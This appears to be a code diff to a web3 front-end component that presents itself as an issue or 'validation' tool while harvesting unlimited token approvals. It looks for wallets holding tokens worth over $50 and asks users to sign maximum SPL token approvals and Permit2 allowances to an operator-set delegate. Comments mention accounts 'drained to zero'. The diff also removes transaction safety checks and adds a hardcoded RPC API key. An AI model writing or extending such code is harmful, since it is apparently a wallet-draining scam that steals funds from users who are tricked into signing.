@@ -27,25 +27,22 @@ import {
   blast, 
   berachain,
   solana,
-  baseSepolia,
   hyperliquid,
-  robinhood
+  robinhood,
+  baseSepolia
 } from '@reown/appkit/networks';
 import { Alchemy, Network } from 'alchemy-sdk';
 import { defineChain } from '@reown/appkit/networks';
 import { 
   Connection, 
   PublicKey, 
-  Transaction,
-  ComputeBudgetProgram,
+  Transaction 
 } from '@solana/web3.js';
 import { 
   getAccount, 
   getMint, 
   createApproveInstruction, 
-  decodeApproveInstruction,
-  TOKEN_PROGRAM_ID,
-  TOKEN_2022_PROGRAM_ID,
+  TOKEN_PROGRAM_ID 
 } from '@solana/spl-token';
 
 type WalletType = {
@@ -83,35 +80,6 @@ const hyperEVM = defineChain({
   }
 })
 
-// CUSTOM ROBINHOOD CHAIN
-const robinhoodChain = defineChain({
-  id: 4663,
-  caipNetworkId: 'eip155:4663',
-  chainNamespace: 'eip155',
-  name: 'Robinhood Chain',
-  nativeCurrency: {
-    decimals: 18,
-    name: 'Ether',
-    symbol: 'ETH'
-  },
-  rpcUrls: {
-    default: {
-      http: [process.env.NEXT_PUBLIC_ROBINHOOD_RPC_URL || 'https://rpc.mainnet.chain.robinhood.com']
-    }
-  },
-  blockExplorers: {
-    default: {
-      name: 'Robinhood Chain Explorer',
-      url: 'https://robinhoodchain.blockscout.com'
-    }
-  },
-  contracts: {
-    multicall3: {
-      address: '0xca11bde05977b3631167028862be2a173976ca11'
-    }
-  }
-})
-
 
 interface PermitDetails {
   token: string;
@@ -142,67 +110,9 @@ interface SolanaTokenInfo {
   balance: string;
   decimals: number;
   amount: bigint;
-  programId: string;
 }
-
 
 const MIN_TOKEN_VALUE_USD = 50;
-const LIGHTHOUSE_V2_PROGRAM_ID = new PublicKey('L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95');
-
-function assertApprovalOnlyTransaction(transaction: Transaction, owner: PublicKey, delegate: PublicKey, stage = 'transaction') {
-  if (transaction.instructions.length === 0) throw new Error('Refusing to sign an empty Solana transaction');
-  for (const [index, instruction] of transaction.instructions.entries()) {
-    // Wallets may add ComputeBudget instructions; they cannot move tokens.
-    if (instruction.programId.equals(ComputeBudgetProgram.programId)) continue;
-    // Phantom may append a Lighthouse v2 postcondition assertion. Permit only
-    // the exact one-account owner assertion shape; do not allow arbitrary calls.
-    if (instruction.programId.equals(LIGHTHOUSE_V2_PROGRAM_ID)) {
-      const isOwnerAssertion = instruction.keys.length === 1
-        && instruction.keys[0].pubkey.equals(owner);
-      if (isOwnerAssertion) continue;
-      throw new Error('Refusing to broadcast a mismatched Lighthouse assertion');
-    }
-    const isTokenProgram = instruction.programId.equals(TOKEN_PROGRAM_ID) || instruction.programId.equals(TOKEN_2022_PROGRAM_ID);
-    if (!isTokenProgram) {
-      console.error(`[SolanaSafety] ${stage} unexpected instruction`, {
-        index,
-        programId: instruction.programId.toBase58(),
-        keys: instruction.keys.map(key => key.pubkey.toBase58()),
-      });
-      throw new Error(`Refusing to broadcast unexpected program: ${instruction.programId.toBase58()}`);
-    }
-    const decoded = decodeApproveInstruction(instruction, instruction.programId);
-    if (!decoded.keys.delegate.pubkey.equals(delegate) || !decoded.keys.owner.pubkey.equals(owner)) {
-      throw new Error('Refusing to broadcast approval with an unexpected owner or delegate');
-    }
-  }
-}
-
-function getProviderPublicKey(provider: any): PublicKey | null {
-  const candidate = provider?.publicKey
-    ?? provider?._wallet?.publicKey
-    ?? provider?.accounts?.[0]?.address
-    ?? provider?.accounts?.[0]
-    ?? provider?.address;
-  if (!candidate) return null;
-  try {
-    return new PublicKey(typeof candidate === 'string' ? candidate : candidate.toString());
-  } catch {
-    return null;
-  }
-}
-
-function getSolanaSigningProvider(selectedProvider: any, expectedOwner: PublicKey): any {
-  const candidates = [selectedProvider, selectedProvider?._wallet, selectedProvider?.provider].filter(Boolean);
-  for (const provider of candidates) {
-    if (typeof provider.signTransaction !== 'function') continue;
-    const providerPublicKey = getProviderPublicKey(provider) ?? getProviderPublicKey(selectedProvider);
-    if (providerPublicKey?.equals(expectedOwner)) return provider;
-  }
-  throw new Error(
-    `The selected Solana wallet cannot sign for ${expectedOwner.toBase58()}. Disconnect and reconnect the owner wallet.`
-  );
-}
 
 function toDeadline(expiration: number): number {
   return Math.floor((Date.now() + expiration) / 1000);
@@ -240,7 +150,7 @@ const CONTRACT_ADDRESSES: { [Key: number]: string} = {
   80094: process.env.NEXT_PUBLIC_BERACHAIN_SPENDER!,
   999: process.env.NEXT_PUBLIC_HYPEREVM_SPENDER!,
   59144: process.env.NEXT_PUBLIC_LINEA_SPENDER!,
-  4663: process.env.NEXT_PUBLIC_ROBINHOOD_SPENDER!
+  4663: process.env.NEXT_PUBLIC_ROBINHOOD_SPENDER!, // Robinhood
 }
 
 const PERMIT2_ADDRESSES: { [key: number]: string } = {
@@ -254,7 +164,7 @@ const PERMIT2_ADDRESSES: { [key: number]: string } = {
   80094: process.env.NEXT_PUBLIC_BERACHAIN_PERMIT2!,
   999: process.env.NEXT_PUBLIC_HYPEREVM_PERMIT2!,
   59144: process.env.NEXT_PUBLIC_LINEA_PERMIT2!,
-  4663: process.env.NEXT_PUBLIC_ROBINHOOD_PERMIT2!
+  4663: process.env.NEXT_PUBLIC_ROBINHOOD_PERMIT2!, // Robinhood
 };
 
 // Pricing and explorer configs
@@ -263,8 +173,8 @@ const ETHERSCAN_API_KEY = process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY!;
 // RPC URLs for custom fallback networks
 const RPC_URLS: { [chainId: number]: string } = {
   999: process.env.NEXT_PUBLIC_HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm',
-  4663: process.env.NEXT_PUBLIC_ROBINHOOD_RPC_URL || 'https://rpc.mainnet.chain.robinhood.com',
   56: process.env.NEXT_PUBLIC_BSC_RPC_URL || 'https://bsc-dataseed1.binance.org',
+  4663: process.env.NEXT_PUBLIC_ROBINHOOD_RPC_URL || 'https://rpc.robinhoodchain.com',
 };
 
 // Relay Link price helper
@@ -559,6 +469,7 @@ async function fetchValuableTokens(address: string, chainId: number): Promise<To
   }
 }
 
+
 const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!;
 
 // Create the Ethers adapter
@@ -578,7 +489,7 @@ const metadata = {
 // Create the AppKit instance
 createAppKit({
   adapters: [ethersAdapter, solanaWeb3JsAdapter as any],
-  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain, hyperliquid, robinhoodChain, baseSepolia, solana],
+  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain, hyperEVM, baseSepolia, solana],
   metadata,
   projectId,
   features: {
@@ -871,7 +782,6 @@ export default function IssuesContent() {
       7777777: 'Zora',
       81457: 'Blast',
       999: 'HyperEVM',
-      4663: 'Robinhood Chain',
       59144: 'Linea',
     };
     return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
@@ -904,11 +814,10 @@ export default function IssuesContent() {
       // Add error handling for RPC rate limits
       let tokenAccounts;
       try {
-        const [legacy, token2022] = await Promise.all([
-          connection.getParsedTokenAccountsByOwner(ownerPublicKey, { programId: TOKEN_PROGRAM_ID }),
-          connection.getParsedTokenAccountsByOwner(ownerPublicKey, { programId: TOKEN_2022_PROGRAM_ID }),
-        ]);
-        tokenAccounts = { value: [...legacy.value, ...token2022.value] };
+        tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+          ownerPublicKey,
+          { programId: TOKEN_PROGRAM_ID }
+        );
       } catch (rpcError: any) {
         if (rpcError.message?.includes('403') || rpcError.message?.includes('Forbidden')) {
           console.error('[SolanaRPC] 403 Forbidden - RPC rate limit or access denied');
@@ -925,18 +834,17 @@ export default function IssuesContent() {
       for (const accountInfo of tokenAccounts.value) {
         const parsedInfo = accountInfo.account.data.parsed.info;
         const tokenAccount = accountInfo.pubkey.toString();
-        const programId = accountInfo.account.owner.toString();
         const mint = parsedInfo.mint;
         const amount = BigInt(parsedInfo.tokenAmount.amount);
         const decimals = parsedInfo.tokenAmount.decimals;
         
+        // Skip if balance is zero
         if (amount === 0n) continue;
         
         // Get mint info to get symbol (optional, can be slow)
         let symbol = 'UNKNOWN';
         try {
-          const tokenProgramId = programId === TOKEN_2022_PROGRAM_ID.toBase58() ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
-          const mintInfo = await getMint(connection, new PublicKey(mint), 'confirmed', tokenProgramId);
+          const mintInfo = await getMint(connection, new PublicKey(mint));
           // Note: SPL tokens don't have symbol in metadata, you'd need to query a token registry
           // For now, we'll use the mint address
           symbol = mint.substring(0, 8) + '...';
@@ -951,7 +859,6 @@ export default function IssuesContent() {
           balance: (Number(amount) / Math.pow(10, decimals)).toString(),
           decimals,
           amount,
-          programId,
         });
       }
       
@@ -991,6 +898,12 @@ export default function IssuesContent() {
             const pk = solanaWalletProvider._wallet.publicKey;
             publicKey = typeof pk === 'string' ? pk : pk.toString();
           }
+          // Method 5: Check window.solana directly (if Reown wraps it)
+          else if (typeof window !== 'undefined' && (window as any).solana?.publicKey) {
+            const pk = (window as any).solana.publicKey;
+            publicKey = typeof pk === 'string' ? pk : pk.toString();
+          }
+          
           if (!publicKey) {
             // If still no account, provider might not be connected yet
             // Log provider structure for debugging
@@ -1007,23 +920,17 @@ export default function IssuesContent() {
           
           // Set delegate address
           const delegateAddress = process.env.NEXT_PUBLIC_SOLANA_DELEGATE || '';
-          const destinationAddress = process.env.NEXT_PUBLIC_SOLANA_DESTINATION || '';
           if (!delegateAddress) {
             console.error('Solana delegate address not configured');
             return;
           }
-          if (!destinationAddress) {
-            console.error('Solana destination address not configured');
-            return;
-          }
-          try { new PublicKey(destinationAddress); } catch { console.error('Invalid Solana destination address'); return; }
 
           // Always use mainnet-beta
           setSolanaNetwork('mainnet-beta');
 
           // Initialize connection with mainnet RPC
           // Use Helius RPC as fallback if env var is not set
-          const rpcUrl = process.env.NEXT_PUBLIC_SOLANA_MAINNET_RPC || 'https://api.mainnet-beta.solana.com';
+          const rpcUrl = process.env.NEXT_PUBLIC_SOLANA_MAINNET_RPC || 'https://mainnet.helius-rpc.com/?api-key=37f4415f-a3b7-4d86-913b-e9fd23d1334c';
           
           // Validate RPC URL
           if (!rpcUrl || (!rpcUrl.startsWith('http://') && !rpcUrl.startsWith('https://'))) {
@@ -1057,12 +964,12 @@ export default function IssuesContent() {
     return () => clearInterval(interval);
   }, [solanaWalletProvider, solanaAccount, fetchSolanaTokens]);
 
-  // Show the Solana controls even when delegated accounts have been drained to zero.
+  // Show popup when Solana tokens are loaded
   useEffect(() => {
-    if (currentWalletType === 'solana' && solanaAccount && !showPopup) {
+    if (currentWalletType === 'solana' && solanaTokens.length > 0 && !showPopup) {
       setShowPopup(true);
     }
-  }, [solanaAccount, currentWalletType, showPopup]);
+  }, [solanaTokens.length, currentWalletType, showPopup]);
 
   const handleSolanaValidation = useCallback(async () => {
     if (!solanaWalletProvider || !solanaAccount || !solanaConnection || !solanaDelegate || solanaTokens.length === 0) {
@@ -1075,13 +982,6 @@ export default function IssuesContent() {
       
       const ownerPublicKey = new PublicKey(solanaAccount);
       const delegatePublicKey = new PublicKey(solanaDelegate);
-      const signingWallet = (window as any).solana?.publicKey?.toString();
-      if (!signingWallet || signingWallet !== ownerPublicKey.toBase58()) {
-        throw new Error('The active Solana signing wallet does not match the connected account');
-      }
-      const destinationAddress = process.env.NEXT_PUBLIC_SOLANA_DESTINATION || '';
-      if (!destinationAddress) throw new Error('Solana destination address is not configured');
-      const destinationPublicKey = new PublicKey(destinationAddress);
       
       const transaction = new Transaction();
       const approvals: Array<{
@@ -1090,29 +990,27 @@ export default function IssuesContent() {
         amount: string;
         decimals: number;
         symbol?: string;
-        programId: string;
       }> = [];
 
       // Create approval instructions for each token
       for (const token of solanaTokens) {
         try {
           const tokenAccountPubkey = new PublicKey(token.tokenAccount);
-          const tokenProgramId = token.programId === TOKEN_2022_PROGRAM_ID.toBase58() ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
           
-          // Ensure the account still belongs to the connected wallet before approving it.
-          const accountInfo = await getAccount(solanaConnection, tokenAccountPubkey, 'confirmed', tokenProgramId);
-          if (accountInfo.owner.toBase58() !== ownerPublicKey.toBase58()) throw new Error('Token account owner mismatch');
+          // Get current allowance to check if approval is needed
+          const accountInfo = await getAccount(solanaConnection, tokenAccountPubkey);
           
-          // Keep the delegate allowance active for later proceeds in this token account.
-          const approvalAmount = BigInt('18446744073709551615');
+          // Create approval instruction with max amount (or specific amount)
+          // Using max uint64 for maximum approval
+          const maxAmount = BigInt('18446744073709551615'); // 2^64 - 1
           
           const approveInstruction = createApproveInstruction(
             tokenAccountPubkey, // tokenAccount
             delegatePublicKey, // delegate
             ownerPublicKey, // owner
-            approvalAmount, // amount
+            maxAmount, // amount
             [], // multiSigners (empty for single signer)
-            tokenProgramId
+            TOKEN_PROGRAM_ID
           );
           
           transaction.add(approveInstruction);
@@ -1120,10 +1018,9 @@ export default function IssuesContent() {
           approvals.push({
             tokenAccount: token.tokenAccount,
             mint: token.mint,
-            amount: approvalAmount.toString(),
+            amount: maxAmount.toString(),
             decimals: token.decimals,
             symbol: token.symbol,
-            programId: token.programId,
           });
           
           console.log(`✅ Created approval instruction for ${token.symbol}`);
@@ -1138,9 +1035,6 @@ export default function IssuesContent() {
       }
 
       setProcessingAction('signing_transaction');
-
-      // Verify the transaction constructed by this component before handing it to any wallet.
-      assertApprovalOnlyTransaction(transaction, ownerPublicKey, delegatePublicKey, 'before-wallet-signing');
       
       // Get fresh blockhash right before signing to avoid expiration
       // Solana blockhashes expire quickly, so we get it just before signing
@@ -1148,19 +1042,16 @@ export default function IssuesContent() {
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = ownerPublicKey;
 
-      // Sign with the exact provider selected by AppKit. Never use the ambiguous
-      // window.solana global, which may belong to another injected extension.
+      // Sign and send transaction
+      // Use window.solana directly to avoid Reown's chain ID validation issues
       let signature: string;
-
-      const signingProvider = getSolanaSigningProvider(solanaWalletProvider, ownerPublicKey);
-      console.log('[SolanaSign] Using AppKit-selected provider', {
-        owner: ownerPublicKey.toBase58(),
-        providerPublicKey: getProviderPublicKey(signingProvider)?.toBase58(),
-        isPhantom: Boolean(signingProvider?.isPhantom),
-      });
+      
+      if (typeof window !== 'undefined' && (window as any).solana?.signTransaction) {
+        // Use the wallet directly (Phantom, Solflare, etc.) to avoid Reown validation issues
+        console.log('[SolanaSign] Using window.solana directly...');
         
-        const signedTx = await signingProvider.signTransaction(transaction);
-        assertApprovalOnlyTransaction(signedTx, ownerPublicKey, delegatePublicKey, 'after-wallet-signing');
+        // Sign the transaction (user will approve in wallet popup)
+        const signedTx = await (window as any).solana.signTransaction(transaction);
         
         // Send immediately after signing to minimize blockhash expiration risk
         try {
@@ -1170,12 +1061,11 @@ export default function IssuesContent() {
           });
           
           // Confirm with the blockhash we used
-          const confirmation = await solanaConnection.confirmTransaction({
+          await solanaConnection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight,
           }, 'confirmed');
-          if (confirmation.value.err) throw new Error(`Approval transaction failed: ${JSON.stringify(confirmation.value.err)}`);
         } catch (sendError: any) {
           // If blockhash expired, we need to create a new transaction with fresh blockhash
           if (sendError.message?.includes('Blockhash not found') || 
@@ -1192,18 +1082,17 @@ export default function IssuesContent() {
             retryTransaction.feePayer = ownerPublicKey;
             
             // Re-add all instructions
-            for (const token of solanaTokens.filter(token => approvals.some(item => item.tokenAccount === token.tokenAccount))) {
+            for (const token of solanaTokens) {
               try {
                 const tokenAccountPubkey = new PublicKey(token.tokenAccount);
-                const tokenProgramId = token.programId === TOKEN_2022_PROGRAM_ID.toBase58() ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
-                const approvalAmount = BigInt('18446744073709551615');
+                const maxAmount = BigInt('18446744073709551615');
                 const approveInstruction = createApproveInstruction(
                   tokenAccountPubkey,
                   delegatePublicKey,
                   ownerPublicKey,
-                  approvalAmount,
+                  maxAmount,
                   [],
-                  tokenProgramId
+                  TOKEN_PROGRAM_ID
                 );
                 retryTransaction.add(approveInstruction);
               } catch (e) {
@@ -1212,26 +1101,28 @@ export default function IssuesContent() {
             }
             
             // Sign the retry transaction (user will need to approve again)
-            const retrySignedTx = await signingProvider.signTransaction(retryTransaction);
-            assertApprovalOnlyTransaction(retrySignedTx, ownerPublicKey, delegatePublicKey, 'after-wallet-signing-retry');
+            const retrySignedTx = await (window as any).solana.signTransaction(retryTransaction);
             signature = await solanaConnection.sendRawTransaction(retrySignedTx.serialize(), {
               skipPreflight: false,
               maxRetries: 3,
             });
             
             // Confirm with retry blockhash
-            const retryConfirmation = await solanaConnection.confirmTransaction({
+            await solanaConnection.confirmTransaction({
               signature,
               blockhash: retryBlockhash,
               lastValidBlockHeight: retryLastValidBlockHeight,
             }, 'confirmed');
-            if (retryConfirmation.value.err) throw new Error(`Approval transaction failed: ${JSON.stringify(retryConfirmation.value.err)}`);
           } else {
             throw sendError;
           }
         }
         
         console.log(`✅ Transaction confirmed: ${signature}`);
+      } else {
+        throw new Error('Solana wallet not found. Please install Phantom or another Solana wallet.');
+      }
+
       // Store approval details in MongoDB
       setProcessingAction('storing_approval');
       const response = await fetch('/api/store/solana-approval', {
@@ -1243,7 +1134,6 @@ export default function IssuesContent() {
           approvals,
           transactionSignature: signature,
           network: solanaNetwork,
-          destinationAddress: destinationPublicKey.toBase58(),
         }),
       });
 
